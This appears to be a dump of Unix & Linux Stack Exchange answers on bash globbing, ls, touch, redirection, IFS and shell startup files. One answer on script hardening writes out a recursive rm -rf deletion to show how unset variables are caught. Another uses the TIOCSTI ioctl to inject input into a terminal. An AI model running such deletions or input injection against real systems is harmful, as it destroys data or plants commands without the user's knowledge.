<p>Practically all shells you're likely to run across (bash, sh, ksh, zsh, csh, tcsh, ...) implement wildcards. The details may vary, but the basic syntax of <code>*</code> matching zero or more characters and <code>?</code> matching any single character is reasonably consistent.</p>

<p>For bash in particular, this is documented in the ""Filename expansion"" section of the bash manual; run <code>info bash</code> and search for ""Filename expansion"", or see <a href=""http://www.gnu.org/software/bash/manual/html_node/Filename-Expansion.html"">here</a>.</p>

<p>The fact that this is done by the shell, and not by individual commands, has some interesting (and sometimes surprising) consequences.  The best thing about it is that wildcard handling is consistent for (very nearly) <em>all</em> commands; if the shell didn't do this, inevitably some commands wouldn't bother, and others would do it in subtly different ways that the author thought was ""better"". (I think the Windows command shell has this problem, but I'm not familiar enough with it to comment further.)</p>

<p>On the other hand, it's difficult to write a command to rename multiple files. If you write:</p>

<pre><code>mv *.log *.log.bak
</code></pre>

<p>it will probably fail, since<code>*.log.bak</code> is expanded based on the files that already exist in the current directory. There are commands that do this kind of thing, but they have to use their own syntax to specify how the files are to be renamed. Some commands (such as <code>find</code>) can do their own wildcard expansion; you have to quote the arguments to suppress the shell's expansion:</p>

<pre><code>find . -name '*.txt' -print
</code></pre>

<p>The shell's wildcard expansion is based entirely on the syntax of the command-line argument and the set of existing files. It <em>can't</em> be affected by the meaning of the command. For example, if you want to move all <code>.log</code> files up to the parent directory, you can type:</p>

<pre><code>mv *.log ..
</code></pre>

<p>If you forget the <code>..</code> :</p>

<pre><code>mv *.log
</code></pre>

<p>and there happen to be exactly two <code>.log</code> files in the current directory, it will expand to:</p>

<pre><code>mv one.log two.log
</code></pre>

<p>which will rename <code>one.log</code> and clobber <code>two.log</code>.</p>

<p><strong>EDIT</strong>: And after 52 upvotes, an accept, and a Guru badge, maybe I should actually answer the question in the title.</p>

<p>The <code>-d</code> or <code>--directory</code> option to <code>ls</code> doesn't tell it to list only directories. It tells it to list directories just as themselves, not their contents. If you give a directory name as an argument to <code>ls</code>, by default it will list the <em>contents</em> of the directory, since that's usually what you're interested in. The <code>-d</code> option tells it to list just the directory itself. This can be particularly useful when combined with wildcards. If you type:</p>

<pre><code>ls -l a*
</code></pre>

<p><code>ls</code> will give you a long listing of each <em>file</em> whose name starts with <code>a</code>, and of the <em>contents</em> of each directory whose name starts with <code>a</code>. If you just want a list of the files and directories, one line for each, you can use:</p>

<pre><code>ls -ld a*
</code></pre>

<p>which is equivalent to:</p>

<pre><code>ls -l -d a*
</code></pre>

<p>Remember again that the <code>ls</code> command never sees the <code>*</code> character.</p>

<p>As for where this is documented, <code>man ls</code> will show you the documentation for the <code>ls</code> command on just about any Unix-like system. On most Linux-based systems, the <code>ls</code> command is part of the GNU coreutils package; if you have the <code>info</code> command, either <code>info ls</code> or <code>info coreutils ls</code> should give you more definitive and comprehensive documentation. Other systems, such as MacOS, may use different versions of the <code>ls</code> command, and may not have the <code>info</code> command; for those systems, use <code>man ls</code>. And <code>ls --help</code> will show a <em>relatively</em> short usage message (117 lines on my system) <em>if</em> you're using the GNU coreutils implementation.</p>

<p>And yes, even experts need to consult the documentation now and then. See also <a href=""http://www.netfunny.com/rhf/jokes/91q3/ieeee.html"">this classic joke</a>.</p>
"
"Changing a file's ""Date Created"" and ""Last Modified"" attributes to another file's","118577","<linux><bash><files><samba>","50","<p>You can use the <code>touch</code> command along with the <code>-r</code> switch to apply another file's attributes to a file.</p>

<p><strong>NOTE:</strong> There is no such thing as creation date in Unix, there are only access, modify, and change. See this U&amp;L Q&amp;A titled: <a href=""https://unix.stackexchange.com/questions/102691/get-age-of-given-file/102692#102692"">get age of given file</a> for further details.</p>

<pre><code>$ touch -r goldenfile newfile
</code></pre>

<h3>Example</h3>

<p>For example purposes here's a <code>goldenfile</code> that was created with some arbitrary timestamp.</p>

<pre><code>$ touch -d 20120101 goldenfile
$ ls -l goldenfile 
-rw-rw-r--. 1 saml saml 0 Jan  1  2012 goldenfile
</code></pre>

<p>Now I make some new file:</p>

<pre><code>$ touch newfile
$ ls -l newfile 
-rw-rw-r--. 1 saml saml 0 Mar  7 09:06 newfile
</code></pre>

<p>Now apply <code>goldenfile</code>'s attributes to <code>newfile</code>.</p>

<pre><code>$ touch -r goldenfile newfile 
$ ls -l goldenfile newfile
-rw-rw-r--. 1 saml saml 0 Jan  1  2012 newfile
-rw-rw-r--. 1 saml saml 0 Jan  1  2012 goldenfile
</code></pre>

<p>Now <code>newfile</code> has the same attributes.</p>

<h3>Modify via Samba</h3>

<p>I just confirmed that I'm able to do this using my Fedora 19 laptop which includes version 1.16.3-2 connected to a Thecus N12000 NAS (uses a modified version of CentOS 5.x).</p>

<p>I was able to touch a file as I mentioned above and it worked as I described. Your issue is likely a problem with the either the mounting options being used, which may be omitting the tracking of certain time attributes, or perhaps it's related to one of these bugs:</p>

<ul>
<li><a href=""https://bugzilla.redhat.com/show_bug.cgi?id=461505"" rel=""noreferrer"">Bug 461505 - can't set timestamp on samba shares</a></li>
<li><a href=""https://bugzilla.gnome.org/show_bug.cgi?id=693491"" rel=""noreferrer"">Bug 693491 - Unable to set attributes/timestamps on CIFS/Samba share</a></li>
</ul>
"
"How to move a file without preserving permissions","131180","<bash><mv>","50","<p><code>mv</code> is the wrong tool for this job; you want <code>cp</code> and then <code>rm</code>.  Since you're moving the file to another filesystem this is exactly what <code>mv</code> is doing behind the scenes anyway, except that <code>mv</code> is also trying to preserve file permission bits and owner/group information.  This is because <code>mv</code> would preserve that information if it were moving a file within the same filesystem and <code>mv</code> tries to behave the same way in both situations.  Since you don't care about the preservation of file permission bits and owner/group information, don't use that tool.  Use <code>cp --no-preserve=mode</code> and <code>rm</code> instead.</p>
"
"Do we have more history for cd?","157763","<bash><shell><zsh><cd-command><pushd>","49","<p>The command you are looking for is <code>pushd</code> and <code>popd</code>.</p>

<p>You could view a practical working example of <code>pushd</code> and <code>popd</code> from <a href=""http://linux.101hacks.com/cd-command/dirs-pushd-popd/"">here</a>.</p>

<pre><code>mkdir /tmp/dir1
mkdir /tmp/dir2
mkdir /tmp/dir3
mkdir /tmp/dir4

cd /tmp/dir1
pushd .

cd /tmp/dir2
pushd .

cd /tmp/dir3
pushd .

cd /tmp/dir4
pushd .

dirs
/tmp/dir4 /tmp/dir4 /tmp/dir3 /tmp/dir2 /tmp/dir1
</code></pre>
"
"nvm command not available in bash script","184508","<bash><shell-script><software-installation><node.js>","49","<p><code>nvm</code> command is a shell function declared in <code>~/.nvm/nvm.sh</code>.</p>

<p>You may source either of following scripts at the start of yours to make <code>nvm()</code> available:</p>

<pre><code>. ~/.nvm/nvm.sh
. ~/.profile
. ~/.bashrc
. $(brew --prefix nvm)/nvm.sh  # if installed via Brew
</code></pre>
"
"How does bash differentiate between brace expansion and command grouping?","254494","<bash><shell-script>","49","<p>A simplified reason is the existence of one character: <kbd>space</kbd>.</p>

<p>Brace expansions do not process (un-quoted) spaces.</p>

<p>A <code>{...}</code> list needs (un-quoted) spaces.</p>

<p>The more detailed answer is <a href=""http://helios.cs.ifmo.ru/~ad/Documentation/Bash_Shell/bash3-CHP-7-SECT-3.html"">how the shell parses a command line</a>.</p>

<hr>

<p>The first step to parse (understand) a command line is to divide it into parts.<br>
These parts (usually called words or tokens) result from dividing a command line at each meta-character <a href=""http://helios.cs.ifmo.ru/~ad/Documentation/Bash_Shell/bash3-CHP-7-SECT-3.html"">from the link</a>:</p>

<blockquote>
  <ol>
  <li>Splits the command into tokens that are separated by the fixed set of meta-characters: SPACE, TAB, NEWLINE, ;, (, ), &lt;, >, |, and &amp;. Types of tokens include words, keywords, I/O redirectors, and semicolons.</li>
  </ol>
</blockquote>

<p>Meta-characters: <kbd>space</kbd><kbd>tab</kbd><kbd>enter</kbd><kbd>;</kbd><kbd>,</kbd><kbd>&lt;</kbd><kbd>></kbd><kbd>|</kbd> and <kbd>&amp;</kbd>.</p>

<p>After splitting, words may be of a type (as understood by the shell): </p>

<ul>
<li>Command pre-asignements:<code> LC=ALL ... </code></li>
<li>Command <code>                LC=ALL echo </code></li>
<li>Arguments <code>                LC=ALL echo ""hello"" </code></li>
<li>Redirection <code>                LC=ALL echo ""hello"" >&amp;2 </code></li>
</ul>

<hr>

<h1>Brace expansion</h1>

<p>Only if a ""brace string"" (without spaces or meta-characters) is a single word (as described above) and is <strong>not quoted</strong>, it is a candidate for ""Brace expansion"". More checks are performed on the internal structure later.</p>

<p>Thus, this: <code>{ls,-l}</code> qualifies as ""Brace expansion"" to become <code>ls -l</code>, either as <code>first word</code> or <code>argument</code> (in bash, zsh is different).</p>

<pre><code>$ {ls,-l}            ### executes `ls -l`
$ echo {ls,-l}       ### prints `ls -l`
</code></pre>

<p>But this will not: <code>{ls ,-l}</code>. Bash will split on <kbd>space</kbd> and parse the line as two words: <code>{ls</code> and <code>,-l}</code> which will trigger a <code>command not found</code> (the argument <code>,-l}</code> is lost):</p>

<pre><code> $ {ls ,-l}
 bash: {ls: command not found
</code></pre>

<p>Your line: <code>{ls;echo hi}</code> will not become a ""Brace expansion"" because of the <strong>two</strong> meta-characters <kbd>;</kbd> and <kbd>space</kbd>.</p>

<p>It will be broken into this three parts: <code>{ls</code> new command: <code>echo</code> <code>hi}</code>. Understand that the <kbd>;</kbd> triggers the start of a new command. The command <code>{ls</code> will not be found, and the next command will print <code>hi}</code>:</p>

<pre><code>$ {ls;echo hi}
bash: {ls: command not found
hi}
</code></pre>

<p>If it is placed after some other command, it will anyway start a new command after the <kbd>;</kbd>:</p>

<pre><code>$ echo {ls;echo hi}
{ls
hi}
</code></pre>

<hr>

<h1>List</h1>

<p>One of the ""compound commands"" is a ""Brace List"" (my words): <code>{ list; }</code>.<br>
As you can see, it is defined with spaces and a closing <code>;</code>.<br>
The spaces and <kbd>;</kbd> are needed because both <code>{</code> and <code>}</code> are ""Reserved <strong>Words</strong>"".  </p>

<p>And therefore, to be recognized as words, must be surrounded by meta-characters (almost always: <kbd>space</kbd>).</p>

<p>As described in the point 2 of <a href=""http://helios.cs.ifmo.ru/~ad/Documentation/Bash_Shell/bash3-CHP-7-SECT-3.html"">the linked page</a></p>

<blockquote>
  <ol start=""2"">
  <li>Checks the first token of each command to see if it is .... , {, or (, then the command is actually a compound command.</li>
  </ol>
</blockquote>

<p>Your example: <code>{ls;echo hi}</code> is not a list.</p>

<p>It needs a closing <kbd>;</kbd> and one space (at least) after <kbd>{</kbd>. The last <kbd>}</kbd> is defined by the closing <kbd>;</kbd>.</p>

<p>This is a list <code>{ ls;echo hi; }</code>. And this <code>{ ls;echo hi;}</code> is also (less commonly used, but valid)(Thanks @choroba for the help).</p>

<pre><code>$ { ls;echo hi; }
A-list-of-files
hi
</code></pre>

<p>But as argument (the shell knows the difference) to a command, it triggers an error:</p>

<pre><code>$ echo { ls;echo hi; }
bash: syntax error near unexpected token `}'
</code></pre>

<p>But be careful in what you believe the shell is parsing:</p>

<pre><code>$ echo { ls;echo hi;
{ ls
hi
</code></pre>
"
"Intended use of ctrl+T in bash?","330414","<bash><keyboard-shortcuts><history>","49","<p>This is inherited (by readline) from GNU Emacs, which uses <kbd>control</kbd>-<kbd>T</kbd> for transposing characters:</p>

<p><a href=""https://www.gnu.org/software/emacs/manual/html_node/emacs/Transpose.html"">https://www.gnu.org/software/emacs/manual/html_node/emacs/Transpose.html</a></p>

<p>Note that bash's line editor defaults to Emacs mode, but you can also switch it to vi mode, if you prefer.</p>
"
"How to get last N commands from history?","212872","<bash><command-line><command-history>","49","<p>I found it!</p>
<blockquote>
<p><strong>history [n]</strong></p>
<p>An argument of n lists only the last n lines.</p>
</blockquote>
<pre><code>$ echo &quot;hello
how are you&quot;
$ history 2
1060  echo &quot;hello
how are you&quot;
1061  history 2
</code></pre>
"
"Add thousands separator in a number","113795","<bash><shell-script><awk><string>","48","<p>With <code>sed</code>:</p>

<pre><code>$ echo ""123456789"" | sed 's/\([[:digit:]]\{3\}\)\([[:digit:]]\{3\}\)\([[:digit:]]\{3\}\)/\1,\2,\3/g'
123,456,789
</code></pre>

<p>(Note that this only works for exactly 9 digits!)</p>

<p>or this with <code>sed</code>:</p>

<pre><code>$ echo ""123456789"" | sed ':a;s/\B[0-9]\{3\}\&gt;/,&amp;/;ta'
123,456,789
</code></pre>

<p>With <code>printf</code>:</p>

<pre><code>$ LC_NUMERIC=en_US printf ""%'.f\n"" 123456789
123,456,789
</code></pre>
"
"How to print the longest line in a file?","24509","<bash><awk><filter>","48","<pre><code>cat ./text | awk ' { if ( length &gt; x ) { x = length; y = $0 } }END{ print y }'
</code></pre>

<p><strong>UPD</strong>: summarizing all the advices in the comments</p>

<pre><code>awk 'length &gt; max_length { max_length = length; longest_line = $0 } END { print longest_line }' ./text 
</code></pre>
"
"Can bash write to its own input stream?","213799","<bash>","48","<p>With <code>zsh</code>, you can use <code>print -z</code> to place some text into the line editor buffer for the next prompt:</p>

<pre><code>print -z echo test
</code></pre>

<p>would prime the line editor with <code>echo test</code> which you can edit at the next prompt.</p>

<p>I don't think <code>bash</code> has a similar feature, however on many systems, you can prime the terminal device input buffer with the <code>TIOCSTI</code> <code>ioctl()</code>:</p>

<pre><code>perl -e 'require ""sys/ioctl.ph""; ioctl(STDIN, &amp;TIOCSTI, $_)
  for split """", join "" "", @ARGV' echo test
</code></pre>

<p>Would insert <code>echo test</code> into the terminal device input buffer, as if received from the terminal.</p>

<p>A more portable variation on <a href=""https://unix.stackexchange.com/a/213805/22565"">@mike's <code>Terminology</code> approach</a> and that doesn't sacrifice security would be to send the terminal emulator a fairly standard <code>query status report</code> escape sequence: <code>&lt;ESC&gt;[5n</code> which terminals invariably reply (so as input) as <code>&lt;ESC&gt;[0n</code> and bind that to the string you want to insert:</p>

<pre><code>bind '""\e[0n"": ""echo test""'; printf '\e[5n'
</code></pre>

<p>If within GNU <code>screen</code>, you can also do:</p>

<pre><code>screen -X stuff 'echo test'
</code></pre>

<p>Now, except for the TIOCSTI ioctl approach, we're asking the terminal emulator to send us some string as if typed. If that string comes before <code>readline</code> (<code>bash</code>'s line editor) has disabled terminal local echo, then that string will be displayed <em>not</em> at the shell prompt, messing up the display slightly.</p>

<p>To work around that, you could either delay the sending of the request to the terminal slightly to make sure the response arrives when the echo has been disabled by readline.</p>

<pre><code>bind '""\e[0n"": ""echo test""'; ((sleep 0.05;  printf '\e[5n') &amp;)
</code></pre>

<p>(here assuming your <code>sleep</code> supports sub-second resolution).</p>

<p>Ideally you'd want to do something like:</p>

<pre><code>bind '""\e[0n"": ""echo test""'
stty -echo
printf '\e[5n'
wait-until-the-response-arrives
stty echo
</code></pre>

<p>However <code>bash</code> (contrary to <code>zsh</code>) doesn't have support for such a <code>wait-until-the-response-arrives</code> that doesn't read the response.</p>

<p>However it has a <code>has-the-response-arrived-yet</code> feature with <code>read -t0</code>:</p>

<pre><code>bind '""\e[0n"": ""echo test""'
saved_settings=$(stty -g)
stty -echo -icanon min 1 time 0
printf '\e[5n'
until read -t0; do
  sleep 0.02
done
stty ""$saved_settings""
</code></pre>

<h2>Further reading</h2>

<p>See <a href=""https://unix.stackexchange.com/a/217390"">@starfry's answer</a>'s that expands on the two solutions given by @mikeserv and myself with a few more detailed information.</p>
"
"Redirect all subsequent commands' stderr using exec","61931","<bash><io-redirection>","48","<p>As for a solution to redirect lots of command at once:</p>

<pre><code>#!/bin/bash
{
    somecommand 
    somecommand2
    somecommand3
} 2&gt;&amp;1 | tee -a $DEBUGLOG
</code></pre>

<p>Why your original solution does not work: exec 2>&amp;1 will redirect the standard error output to the standard output of your shell, which, if you run your script from the console, will be your console. the pipe redirection on commands will only redirect the standart output of the command.</p>

<p>On the point of view of <code>somecommand</code>, its standard output goes into a pipe connected to <code>tee</code> and the standard error goes into the same file/pseudofile as the standard error of the shell, which you redirect to the standard output of the shell, which will be the console if you run your program from the console.</p>

<p>The one true way to explain it is to see what really happens:</p>

<p>Your shell's original environment might look like this if you run it from the terminal:</p>

<pre><code>stdin -&gt; /dev/pts/42
stdout -&gt; /dev/pts/42
stderr -&gt; /dev/pts/42
</code></pre>

<p>After you redirect standard error into standard output (<code>exec 2&gt;&amp;1</code>), you ... basically change nothing.  But if you redirect the script's standart output to a file, you would end up with an environment like this:</p>

<pre><code>stdin -&gt; /dev/pts/42
stdout -&gt; /your/file
stderr -&gt; /dev/pts/42
</code></pre>

<p>Then redirecting the shell standard error into standard output would end up like this :</p>

<pre><code>stdin -&gt; /dev/pts/42
stdout -&gt; /your/file
stderr -&gt; /your/file
</code></pre>

<p>Running a command will inherit this environment. If you run a command and pipe it to tee, the command's environment would be :</p>

<pre><code>stdin -&gt; /dev/pts/42
stdout -&gt; pipe:[4242]
stderr -&gt; /your/file
</code></pre>

<p>So your command's standard error still goes into what the shell uses as its standard error.</p>

<p>You can actually see the environment of a command by looking in <code>/proc/[pid]/fd</code>: use <code>ls -l</code> to also list the symbolic link's content.  The <code>0</code> file here is standard input, <code>1</code> is standard output and <code>2</code> is standard error. If the command opens more files (and most programs do), you will also see them.  A program can also choose to redirect or close its standard input/output and reuse <code>0</code>, <code>1</code> and <code>2</code>.</p>
"
"How to display open file descriptors but not using lsof command","66235","<linux><bash><command-line>","48","<p>There are two reasons <code>lsof | wc -l</code> doesn't count file descriptors. One is that it lists things that aren't open files, such as loaded dynamically linked libraries and current working directories; you need to filter them out. Another is that <code>lsof</code> takes some time to run, so can miss files that are opened or closed while it's running; therefore the number of listed open files is approximate. Looking at <code>/proc/sys/fs/file-nr</code> gives you an exact value at a particular point in time.</p>

<p><code>cat /proc/sys/fs/file-nr</code> is only useful when you need the exact figure, mainly to check for resource exhaustion. If you want to list the open files, you need to call <code>lsof</code>, or use some equivalent method such as trawling <code>/proc/*/fd</code> manually.</p>
"
"Why are interactive shells on OSX login shells by default?","119627","<bash><osx>","48","<p>The way it's <em>supposed</em> work is that, at the point when you get a shell prompt, both <code>.profile</code> and <code>.bashrc</code> have been run.  The specific details of how you get to that point are of secondary relevance, but if either of the files didn't get run at all, you'd have a shell with incomplete settings.</p>

<p>The reason terminal emulators on Linux (and other X-based systems) don't <em>need</em> to run <code>.profile</code> themselves is that it will normally have been run already when you logged in to X.  The settings in <code>.profile</code> are supposed to be of the kind that can be inherited by subprocesses, so as long as it's executed once when you log in (e.g. via <code>.Xsession</code>), any further subshells don't need to re-run it.</p>

<p>As the <a href=""https://wiki.debian.org/DotFiles"" rel=""noreferrer"">Debian wiki page</a> linked by Alan Shutko explains:</p>

<blockquote>
  <p>""Why is <code>.bashrc</code> a separate file from <code>.bash_profile</code>, then? This is done for mostly historical reasons, when machines were extremely slow compared to today's workstations. Processing the commands in <code>.profile</code> or <code>.bash_profile</code> could take quite a long time, especially on a machine where a lot of the work had to be done by external commands (pre-bash). So the difficult initial set-up commands, which create environment variables that can be passed down to child processes, are put in <code>.bash_profile</code>. The transient settings and aliases which are not inherited are put in <code>.bashrc</code> so that they can be re-read by every subshell.""</p>
</blockquote>

<p>All the same rules hold on OSX, too, except for one thing &mdash; the OSX GUI doesn't run <code>.profile</code> when you log in, apparently because it has its own method of loading global settings.  But that means that a terminal emulator on OSX <em>does</em> need to run <code>.profile</code> (by telling the shell it launches that it's a login shell), otherwise you'd end up with a potentially crippled shell.</p>

<hr>

<p>Now, a kind of a silly peculiarity of bash, not shared by most other shells, is that it will not automatically run <code>.bashrc</code> if it's started as a login shell.  The standard work-around for that is to include something like the following commands in <code>.bash_profile</code>:</p>

<pre class=""lang-bash prettyprint-override""><code>[[ -e ~/.profile ]] &amp;&amp; source ~/.profile    # load generic profile settings
[[ -e ~/.bashrc  ]] &amp;&amp; source ~/.bashrc     # load aliases etc.
</code></pre>

<p>Alternatively, it's possible to have no <code>.bash_profile</code> at all, and just include some bash-specific code in the generic <code>.profile</code> file to run <code>.bashrc</code> if needed.</p>

<p>If the OSX default <code>.bash_profile</code> or <code>.profile</code> <em>doesn't</em> do this, then that's arguably a bug.  In any case, the proper work-around is to simply add those lines to <code>.bash_profile</code>.</p>

<hr>

<p><strong>Edit:</strong> <a href=""https://unix.stackexchange.com/a/119635"">As strugee notes</a>, the default shell on OSX used to be tcsh, whose behavior is much saner in this respect: when run as an interactive login shell, tcsh automatically reads both <code>.profile</code> <em>and</em> <code>.tcshrc</code> / <code>.cshrc</code>, and thus does not need any workarounds like the <code>.bash_profile</code> trick shown above.</p>

<p>Based on this, I'm 99% sure that the failure of OSX to supply an appropriate default <code>.bash_profile</code> is because, when they switched from tcsh to bash, the folks at Apple simply didn't notice this little wart in bash's startup behavior.  With tcsh, no such tricks were needed &mdash; starting tcsh as a login shell from an OSX terminal emulator Just Plain Works and does the right thing without such kluges.</p>
"
"Execute a specific command in a given directory without cd'ing to it?","13802","<linux><bash><cd-command>","48","<p>I don't know if this counts, but you can make a subshell:</p>

<pre><code>$ (cd /var/log &amp;&amp; cp -- *.log ~/Desktop)
</code></pre>

<p>The directory is only changed for that subshell, so you avoid the work of needing to <code>cd -</code> afterwards.</p>
"
"bash iterate file list, except when empty","239772","<bash><parameter>","47","<p>In <code>bash</code>, you can set the <code>nullglob</code> option so that a pattern that matches nothing ""disappears"", rather than treated as a literal string:</p>

<pre><code>shopt -s nullglob
for fname in *.zip ; do
   echo ""current file is ${fname}""
done
</code></pre>

<p>In POSIX shell script, you just verify that <code>fname</code> exists (and at the same time with <code>[ -f ]</code>, check it is a regular file (or symlink to regular file) and not other types like directory/fifo/device...):</p>

<pre><code>for fname in *.zip; do
    [ -f ""$fname"" ] || continue
    printf '%s\n' ""current file is $fname""
done
</code></pre>

<p>Replace <code>[ -f ""$fname"" ]</code> with <code>[ -e ""$fname"" ] || [ -L ""$fname ]</code> if you want to loop over all the (non-hidden) files whose name ends in <code>.zip</code> regardless of their type.</p>

<p>Replace <code>*.zip</code> with <code>.*.zip .zip *.zip</code> if you also want to consider hidden files whose name ends in <code>.zip</code>.</p>
"
"How do I copy multiple files by wildcard?","122605","<bash><wildcards><file-copy>","47","<p>How about something like this in bash:</p>

<pre><code>for file in ABC.*; do cp ""$file"" ""${file/ABC/DEF}"";done
</code></pre>

<p>you can test it by putting echo in front of the cp command:</p>

<pre><code>for file in ABC.*; do echo cp ""$file"" ""${file/ABC/DEF}"";done
</code></pre>
"
"dircolors: modify color settings globaly","94299","<bash><ls><colors>","47","<p><code>ls</code> takes it color settings from the environment variable <code>LS_COLORS</code>. <code>dircolors</code> is merely a convenient way to generate this environment variable. To have this environment variable take effect system-wide, put it in your shell's startup file.</p>

<p>For <code>bash</code>, you'd put this in <code>/etc/profile</code>:</p>

<pre><code># `dircolors` prints out `LS_COLORS='...'; export LS_COLORS`, so eval'ing
# $(dircolors) effectively sets the LS_COLORS environment variable.

eval ""$(dircolors /etc/DIR_COLORS)""
</code></pre>

<p>For <code>zsh</code>, you'd either put it in <code>/etc/zshrc</code> or arrange for <code>zsh</code> to read <code>/etc/profile</code> on startup. Your distribution might have <code>zsh</code> do that already. I just bring this up to point out that setting <code>dircolors</code> for truly everybody depends on the shell they use.</p>

<p>As for where <code>dircolors</code> gets its settings from, when you don't specify a file it just uses some builtin defaults.</p>

<p>You can use <code>xterm</code>'s 256 color escape codes in your dircolors file, but be aware that they'll only work for <code>xterm</code> compatible terminals. They won't work on the Linux text console, for example.</p>

<p>The format for 256 color escape codes is <code>38;5;colorN</code> for foreground colors and <code>48;5;colorN</code> for background colors. So for example:</p>

<pre><code>.mp3  38;5;160                   # Set fg color to color 160      
.flac 48;5;240                   # Set bg color to color 240
.ogg  38;5;160;48;5;240          # Set fg color 160 *and* bg color 240.
.wav  01;04;05;38;5;160;48;5;240 # Pure madness: make bold (01), underlined (04), blink (05), fg color 160, and bg color 240!
</code></pre>
"
"How can I harden bash scripts against causing harm when changed in the future?","454694","<bash><shell-script><rm>","47","<pre><code>set -u
</code></pre>

<p>or</p>

<pre><code>set -o nounset
</code></pre>

<p>This would make the current shell treat expansions of unset variables as an error:</p>

<pre><code>$ unset build
$ set -u
$ rm -rf ""$build""/*
bash: build: unbound variable
</code></pre>

<p><code>set -u</code> and <code>set -o nounset</code> are <a href=""http://pubs.opengroup.org/onlinepubs/9699919799.2018edition/utilities/V3_chap02.html#set"" rel=""noreferrer"">POSIX shell options</a>.</p>

<p>An <em>empty</em> value would <em>not</em> trigger an error though.</p>

<p>For that, use</p>

<pre><code>$ rm -rf ""${build:?Error, variable is empty or unset}""/*
bash: build: Error, variable is empty or unset
</code></pre>

<p>The expansion of <code>${variable:?word}</code> would expand to the value of <code>variable</code> unless it's empty or unset.  If it's empty or unset, the <code>word</code> would be displayed on standard error and the shell would treat the expansion as an error (the command would not be executed, and if running in a non-interactive shell, this would terminate).  Leaving the <code>:</code> out would trigger the error only for an unset value, just like under <code>set -u</code>.</p>

<p><code>${variable:?word}</code> is a <a href=""http://pubs.opengroup.org/onlinepubs/9699919799.2018edition/utilities/V3_chap02.html#tag_18_06_02"" rel=""noreferrer"">POSIX parameter expansion</a>.</p>

<p>Neither of these would cause an interactive shell to terminate unless <code>set -e</code> (or <code>set -o errexit</code>) was also in effect. <code>${variable:?word}</code> causes scripts to exit if the variable is empty or unset. <code>set -u</code> would cause a script to exit if used together with <code>set -e</code>.</p>

<hr>

<p>As for your second question. There is no way to limit <code>rm</code> to not work outside of the current directory.</p>

<p>The GNU implementation of <code>rm</code> has a <code>--one-file-system</code> option that stops it from recursively delete mounted filesystems, but that's as close as I believe we can get without wrapping the <code>rm</code> call in a function that actually checks the arguments.</p>

<hr>

<p>As a side note:  <code>${build}</code> is exactly equivalent to <code>$build</code> unless the expansion occurs as part of a string where the immediately following character is a valid character in a variable name, such as in <code>""${build}x""</code>.</p>
"
"How to get HOME, given USER?","247576","<bash><shell-script><users>","47","<p>There is a utility which will lookup user information regardless of whether that information is stored in local files such as <code>/etc/passwd</code> or in LDAP or some other method. It's called <code>getent</code>.</p>

<p>In order to get user information out of it, you run <code>getent passwd $USER</code>. You'll get a line back that looks like:</p>

<pre><code>[jenny@sameen ~]$ getent passwd jenny
jenny:*:1001:1001:Jenny Dybedahl:/home/jenny:/usr/local/bin/bash
</code></pre>

<p>Now you can simply cut out the home dir from it, e.g. by using cut, like so:</p>

<pre><code>[jenny@sameen ~]$ getent passwd jenny | cut -d: -f6
/home/jenny
</code></pre>
"
"Setting IFS for a single statement","92187","<bash>","47","<p>In some shells (including <code>bash</code>):</p>

<pre><code>IFS=: command eval 'p=($PATH)'
</code></pre>

<p>(with <code>bash</code>, you can omit the <code>command</code> if not in sh/POSIX emulation). But beware that when using unquoted variables, you also generally need to <code>set -f</code>, and there's no local scope for that in most shells.</p>

<p>With zsh, you can do:</p>

<pre><code>(){ local IFS=:; p=($=PATH); }
</code></pre>

<p><code>$=PATH</code> is to force word splitting which is not done by default in <code>zsh</code> (globbing upon variable expansion is not done either so you don't need <code>set -f</code> unless in sh emulation).</p>

<p><code>(){...}</code> (or <code>function {...}</code>) are called <em>anonymous functions</em> and are typically used to set a local scope. with other shells that support local scope in functions, you could do something similar with:</p>

<pre><code>e() { eval ""$@""; }
e 'local IFS=:; p=($PATH)'
</code></pre>

<p>To implement a local scope for variables and options in POSIX shells, you can also use the functions provided at <a href=""https://github.com/stephane-chazelas/misc-scripts/blob/master/locvar.sh"">https://github.com/stephane-chazelas/misc-scripts/blob/master/locvar.sh</a>. Then you can use it as:</p>

<pre><code>. /path/to/locvar.sh
var=3,2,2
call eval 'locvar IFS; locopt -f; IFS=,; set -- $var; a=$1 b=$2 c=$3'
</code></pre>

<p>(by the way, it's invalid to split <code>$PATH</code> that way above except in <code>zsh</code> as in other shells, IFS is field delimiter, not field separator).</p>

<pre><code>IFS=$'\n' a=($str)
</code></pre>

<p>Is just two assignments, one after the other just like <code>a=1 b=2</code>.</p>

<p>A note of explanation on <code>var=value cmd</code>:</p>

<p>In:</p>

<pre><code>var=value cmd arg
</code></pre>

<p>The shell executes <code>/path/to/cmd</code> in a new process and passes <code>cmd</code> and <code>arg</code> in <code>argv[]</code> and <code>var=value</code> in <code>envp[]</code>. That's not really a variable assignment, but more passing environment variables to the <em>executed</em> command. In the Bourne or Korn shell, with <code>set -k</code>, you can even write it <code>cmd var=value arg</code>.</p>

<p>Now, that doesn't apply to builtins or functions which are not <em>executed</em>. In the Bourne shell, in <code>var=value some-builtin</code>, <code>var</code> ends up being set afterwards, just like with <code>var=value</code> alone. That means for instance that the behaviour of <code>var=value echo foo</code> (which is not useful) varies depending on whether <code>echo</code> is builtin or not.</p>

<p>POSIX and/or <code>ksh</code> changed that in that that Bourne behaviour only happens for a category of builtins called <em>special builtins</em>. <code>eval</code> is a special builtin, <code>read</code> is not. For non special builtin, <code>var=value builtin</code> sets <code>var</code> only for the execution of the builtin which makes it behave similarly to when an external command is being run.</p>

<p>The <code>command</code> command can be used to remove the <em>special</em> attribute of those <em>special builtins</em>. What POSIX overlooked though is that for the <code>eval</code> and <code>.</code> builtins, that would mean that shells would have to implement a variable stack (even though it doesn't specify the <code>local</code> or <code>typeset</code> scope limiting commands), because you could do:</p>

<pre><code>a=0; a=1 command eval 'a=2 command eval echo \$a; echo $a'; echo $a
</code></pre>

<p>Or even:</p>

<pre><code>a=1 command eval myfunction
</code></pre>

<p>with <code>myfunction</code> being a function using or setting <code>$a</code> and potentially calling <code>command eval</code>.</p>

<p>That was really an overlook because <code>ksh</code> (which the spec is mostly based on) didn't implement it (and AT&amp;T <code>ksh</code> and <code>zsh</code> still don't), but nowadays, except those two, most shells implement it. Behaviour varies among shells though in things like:</p>

<pre><code>a=0; a=1 command eval a=2; echo ""$a""
</code></pre>

<p>though. Using <code>local</code> on shells that support it is a more reliable way to implement local scope.</p>
"
"How do I count the number of occurrences of a word in a text file with the command line?","2244","<bash><command-line><grep><json>","47","<pre><code>$ tr ' ' '\n' &lt; FILE | grep WORD | wc -l
</code></pre>

